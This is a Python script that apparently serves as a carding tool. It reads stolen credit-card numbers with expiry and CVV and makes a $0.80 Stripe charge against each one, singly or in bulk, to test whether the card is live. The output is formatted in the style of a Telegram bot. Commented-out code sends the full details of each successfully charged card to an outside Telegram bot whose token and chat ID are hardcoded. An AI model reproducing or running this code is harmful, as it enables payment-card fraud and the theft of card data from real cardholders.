import re, requests, string, json
import time
import random
import os

SK = os.getenv('SK')
s = requests.session()
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for i in range(6))
Last = ''.join(random.choice(letters) for i in range(6))
PWD = ''.join(random.choice(letters) for i in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'

def get_token(card):
  ccn, mm, yy, cvv = card.split('|',4)
  load = {        
      "card[number]": ccn,
      "card[exp_month]": mm,
      "card[exp_year]": yy,
      "card[cvc]": cvv
  }

  header = {
      "accept": "*/*",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "authorization": 'Bearer '+SK,
      "user-agent": UA,
      "accept-language": "en-US,en;q=0.9"

  }
  r =  s.post('https://api.stripe.com/v1/tokens', data=load, headers=header)
  return r.text

def charge_tok(token):  
  payload = {
      "amount": "80",
      "currency": "USD",            
      "source": token           
  }

  head = {
      "accept": "*/*",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "authorization": 'Bearer '+SK,
      "user-agent": UA,
      "accept-language": "en-US,en;q=0.9"
  }

  r =  s.post('https://api.stripe.com/v1/charges', data=payload, headers=head)
  return r.text

def check_card(card):
  r1 = get_token(card)
  print(r1)
  res1 = json.loads(r1)
  if 'error' in r1:
    
    if 'decline_code' in r1:
      msg = res1['error']['message']
      code = res1['error']['decline_code']
    else:
      msg = "SK rate limit"
      code = res1['error']['code']
  else:
    token = res1['id']
    r2 = charge_tok(token)
    res2 = json.loads(r2)
    if 'error' in r2:
      
      if 'decline_code' in r2:
        msg = res2['error']['message']
        code = res2['error']['decline_code']
      else:
        msg = "SK rate limit"
        code = res2['error']['code']
    elif '"receipt_url": "' in r2:
      msg = 'Payment complete!'
      code = 'Charged 0.8$'
    else:
      msg = 'Error'
      code = 'Error'
  return [code, msg]
  
def single_check(input):
  if len(input) == 0:
      return ("<b>No Card to cv</b>")
  
  x = re.search(r"(?:3|4|5|6)\d{14,15}\|\d{2}\|\d{2,4}\|\d{3,4}", input)
  if x:
    card = x.group(0)
  time1 = time.time() 
  code, msg = check_card(card)
  time2 = time.time()
  return (f'''
<b>CC</b>➟ <code>{card}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg}
<b>CODE</b>➟ {code}
================================================================

<b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
================================================================
''')

def mass_check(input):
  input = re.sub('[a-zA-Z]', '', str(input))
  #list = input.replace('/','').split('\n')
  list = re.findall(r"(?:3|4|5|6)\d{14,15}\|\d{2}\|\d{2,4}\|\d{3,4}", input)
  print(list)
  if list == "":
    return f"""<b>➡️MASS STRIPE CHARGE 0.8$
----------------------------------------------
Status: CC Not Found!!❌
----------------------------------------------</b>
  """
  start=time.time()
  result = ""
  for i in range(len(list)):
    card = list[i]
    code, msg = check_card(card)
    ok = f'''CC: <code>{card}</code>
Response: {msg}
Code: {code}
----------------------------------------------\n'''
    result += ok
  end=time.time()
  tm=f'{round((end-start),2)}s'
  print(result)
  return f"""<b>➡️MASS STRIPE CHARGE 0.8$
----------------------------------------------
Status: Success!!! ✅
Checked: {len(list)} CCs
----------------------------------------------
{result}Time Taken: {tm}
----------------------------------------------</b>"""







# def get_tok(input):
#   #if len(input) == 0:
#       #return ("<b>No Card to cv</b>")

#   #x = re.search(r"(?:3|4|5|6)\d{14,15}\|\d{2}\|\d{2,4}\|\d{3,4}", input)
#   #if x:
#     #card = x.group(0)

#   #ccn, mm, yy, cvv = card.split('|',4)
#   #if mm.startswith('2'):
#       #mm, yy = yy, mm
#   #if len(mm) >= 3:
#       #mm, yy, cvv = yy, cvv, mm
#   #if len(ccn) < 15 or len(ccn) > 16:
#       #return ('<b>Failed to parse Card</b>\nReason: Invalid Format!</b>') 
  



#   x = re.findall(r'\d+', input)
#   print(x)
#   ccn = x[0]
#   print(ccn)
#   mm = x[1]
#   yy = x[2]
#   cvv = x[3]
#   if mm.startswith('2'):
#             mm, yy = yy, mm
#   if len(mm) >= 3:
#             mm, yy, cvv = yy, cvv, mm
#   if len(ccn) < 15 or len(ccn) > 16:
#             return ('<b>Failed to parse Card</b>\n'
#                                        '<b>Reason: Invalid Format!</b>')   
#   BIN = ccn[:6]

  
  
 

#         # hmm
#   load = {        
#             "card[number]": ccn,
#             "card[exp_month]": mm,
#             "card[exp_year]": yy,
#             "card[cvc]": cvv
#         }

#   header = {
#             "accept": "*/*",
#             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
#             "authorization": 'Bearer '+SK,
#             "user-agent": UA,
#             "accept-language": "en-US,en;q=0.9"

#         }
#   time1 = time.time() 
#   rx =  requests.post('https://api.stripe.com/v1/tokens',
#                           data=load, headers=header)
#   res = rx.json()    
#   LastF = f'************{ccn[-4:]}'
#   time2 = time.time()
  
#   if 'declined' in rx.text:
            
#            msg = res['error']['message']
#            msg2 = res['error']['decline_code']
#            return (f'''
# ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
# <b>STATUS</b>➟ Declined
# <b>MSG</b>➟ {msg}
# <b>CODE</b>➟ {msg2}
# ================================================================

# <b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
# ================================================================

# ''')
#   if 'incorrect_number' in rx.text:
#             res = rx.json()
#             msg = res['error']['message']
#             return (f'''
# ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
# <b>STATUS</b>➟ Incorrect_number
# <b>MSG</b>➟ Your card number is incorrect.
# ================================================================

# <b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
# ================================================================
# ''')
#   if 'Request rate limit exceeded.' in rx.text:
#             res = rx.json()
#             msg = res['error']['message']
#             return (f'''
# ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
# <b>STATUS</b>➟ Request rate limit exceeded.
# <b>MSG</b>➟ {msg}
# ================================================================

# <b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
# ================================================================
# ''')

#   if 'API Key provided' in rx.text:
#             res = rx.json()
#             msg = res['error']['message']
#             return (f'''
# ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
# <b>STATUS</b>➟ API Key provided
# <b>MSG</b>➟ {msg}
# ================================================================

# <b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
# ================================================================
# ''')
#   if 'security code is invalid' in rx.text:
#             res = rx.json()
#             msg = res['error']['message']
#             return (f'''
# ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
# <b>STATUS</b>➟ Security code is invalid.
# <b>MSG</b>➟ {msg}
# ================================================================

# <b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
# ================================================================
# ''')
#   if 'invalid_' in rx.text:
#           msg = res['error']['message']
#           return (f'''
# ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
# <b>STATUS</b>➟ ERROR
# <b>MSG</b>➟ {msg}
# ================================================================
# ================================================================

# <b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
# ================================================================
# ''')
#   if 'incorrect_number' in rx.text:
#           msg = res['error']['message']
#           return (f'''
# ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
# <b>STATUS</b>➟ ERROR
# <b>MSG</b>➟ {msg}
# ================================================================
# ================================================================

# <b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
# ================================================================
# ''')
#   token = rx.json()['id']
#   return token
     
# def charge_tok(input):  
        
#   payload = {
#       "amount": "80",
#       "currency": "USD",            
#       "source": token           
#   }

#   head = {
#       "accept": "*/*",
#       "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
#       "authorization": 'Bearer '+SK,
#       "user-agent": UA,
#       "accept-language": "en-US,en;q=0.9"
#   }
  

#   ri =  requests.post('https://api.stripe.com/v1/charges', data=payload, headers=head)
#   res1 = ri.json()
#   msg1 = res1['error']['message']
  
#   card = res1['card']
#   country = card['country']
#   brand = card['brand']
#   funding = card['funding']

#   time3 = time.time()

#   if 'Payment complete' in ri.text:
#     requests.get('https://api.telegram.org/bot5380276548:AAGpPwcq33EcsQQ8WKyS_htKJUU3SWSkxPk/sendMessage?chat_id=1924942921&text=Charge:'+ccn+'|'+mm+'|'+yy+'|'+cvv+'')
#     return (f'''
# ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
# <b>STATUS</b>➟ Charge 0.8$✅
# <b>MSG</b>➟ Payment complete!
# ================================================================
# 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
# 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
# ================================================================
# <b>PROXY-IP</b> <code>{b}</code>
# <b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
# ================================================================
# ''')

#   if 'incorrect_cvc' in ri.text:        
#     return (f'''
# ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
# <b>STATUS</b>➟ #ApprovedCCN
# <b>MSG</b>➟ {msg1}
# ================================================================
# 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
# 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
# ================================================================
# <b>PROXY-IP</b> <code>{b}</code>
# <b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
# ================================================================
# ''')
#   if 'Request rate limit exceeded.' in ri.text:
#     return (f'''
# ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
# <b>STATUS</b>➟ Request rate limit exceeded.
# <b>MSG</b>➟ {msg1}
# ================================================================
# 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
# 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
# ================================================================
# <b>PROXY-IP</b> <code>{b}</code>
# <b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
# ================================================================
# ''')

#   if 'API Key provided' in ri.text:
#     return (f'''
# ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
# <b>STATUS</b>➟ API Key provided
# <b>MSG</b>➟ {msg1}
# ================================================================
# 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
# 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
# ================================================================
# <b>PROXY-IP</b> <code>{b}</code>
# <b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
# ================================================================
# ''')

#   if 'insufficient_funds' in ri.text:
#     return (f'''
# ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
# <b>STATUS</b>➟ Insufficient_funds
# <b>MSG</b>➟ {msg1}
# ================================================================
# 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
# 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
# ================================================================
# <b>PROXY-IP</b> <code>{b}</code>
# <b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
# ================================================================
# ''')

#   if 'declined' in ri.text:
#     msg2 = res1['error']['decline_code']
#     return (f'''
# ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
# <b>STATUS</b>➟ Declined
# <b>MSG</b>➟ {msg1}
# <b>CODE</b>➟ {msg2}
# ================================================================
# 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
# 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
# ================================================================
# <b>PROXY-IP</b> <code>{b}</code>
# <b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
# ================================================================
# ''')